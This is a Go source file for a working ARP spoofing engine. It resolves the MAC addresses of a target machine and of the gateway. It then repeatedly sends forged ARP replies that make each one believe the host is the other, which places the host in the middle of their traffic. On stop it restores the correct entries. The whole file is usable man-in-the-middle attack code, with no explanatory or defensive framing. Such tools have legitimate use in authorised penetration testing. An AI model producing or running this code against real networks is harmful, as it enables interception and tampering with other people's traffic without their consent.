package spoofer

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Engine manages the ARP spoofing lifecycle.
type Engine struct {
	InterfaceName string
	TargetIP      net.IP
	GatewayIP     net.IP
	TargetMAC     net.HardwareAddr
	GatewayMAC    net.HardwareAddr
	HostMAC       net.HardwareAddr
	
	handle    *pcap.Handle
	stopChan  chan struct{}
	isRunning bool
}

// NewEngine initializes the spoofing engine by resolving MAC addresses.
func NewEngine(targetIPStr, gatewayIPStr, interfaceName string) (*Engine, error) {
	targetIP := net.ParseIP(targetIPStr)
	gatewayIP := net.ParseIP(gatewayIPStr)
	if targetIP == nil || gatewayIP == nil {
		return nil, fmt.Errorf("invalid IP addresses")
	}

	// Get Host MAC
	iface, err := net.InterfaceByName(interfaceName)
	if err != nil {
		return nil, fmt.Errorf("failed to get interface: %v", err)
	}

	// Resolve Target MAC
	fmt.Printf("Resolving Target MAC (%s)...\n", targetIPStr)
	targetMAC, err := GetMAC(targetIPStr, interfaceName)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve target MAC: %v", err)
	}
	fmt.Printf("Target MAC: %s\n", targetMAC)

	// Resolve Gateway MAC
	fmt.Printf("Resolving Gateway MAC (%s)...\n", gatewayIPStr)
	gatewayMAC, err := GetMAC(gatewayIPStr, interfaceName)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve gateway MAC: %v", err)
	}
	fmt.Printf("Gateway MAC: %s\n", gatewayMAC)

	return &Engine{
		InterfaceName: interfaceName,
		TargetIP:      targetIP,
		GatewayIP:     gatewayIP,
		TargetMAC:     targetMAC,
		GatewayMAC:    gatewayMAC,
		HostMAC:       iface.HardwareAddr,
		stopChan:      make(chan struct{}),
	}, nil
}

// Start begins the ARP spoofing loop in a background goroutine.
func (e *Engine) Start() error {
	var err error
	e.handle, err = pcap.OpenLive(e.InterfaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("failed to open pcap handle: %v", err)
	}
	
	e.isRunning = true
	go e.spoofLoop()
	return nil
}

// Stop halts the spoofing loop and sends corrective ARP packets.
func (e *Engine) Stop() {
	if !e.isRunning {
		return
	}
	close(e.stopChan)
	e.isRunning = false

	// Allow the loop to exit
	time.Sleep(100 * time.Millisecond)

	e.cleanup()
	if e.handle != nil {
		e.handle.Close()
	}
}

func (e *Engine) spoofLoop() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-e.stopChan:
			return
		case <-ticker.C:
			if err := e.sendSpoofPackets(); err != nil {
				log.Printf("Error sending spoof packets: %v", err)
			}
		}
	}
}

func (e *Engine) sendSpoofPackets() error {
	// Tell Target that WE are the Gateway
	// SrcMAC: Host, SrcIP: Gateway -> DstMAC: Target
	if err := e.sendARP(e.HostMAC, e.GatewayIP, e.TargetMAC, e.TargetIP); err != nil {
		return err
	}

	// Tell Gateway that WE are the Target
	// SrcMAC: Host, SrcIP: Target -> DstMAC: Gateway
	if err := e.sendARP(e.HostMAC, e.TargetIP, e.GatewayMAC, e.GatewayIP); err != nil {
		return err
	}
	return nil
}

func (e *Engine) cleanup() {
	log.Println("Restoring network (Unspoofing)...")
	// Tell Target the REAL Gateway MAC
	for i := 0; i < 3; i++ {
		_ = e.sendARP(e.GatewayMAC, e.GatewayIP, e.TargetMAC, e.TargetIP)
		_ = e.sendARP(e.TargetMAC, e.TargetIP, e.GatewayMAC, e.GatewayIP)
		time.Sleep(100 * time.Millisecond)
	}
}

func (e *Engine) sendARP(srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP.To4()),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    []byte(dstIP.To4()),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}
	return e.handle.WritePacketData(buf.Bytes())
}

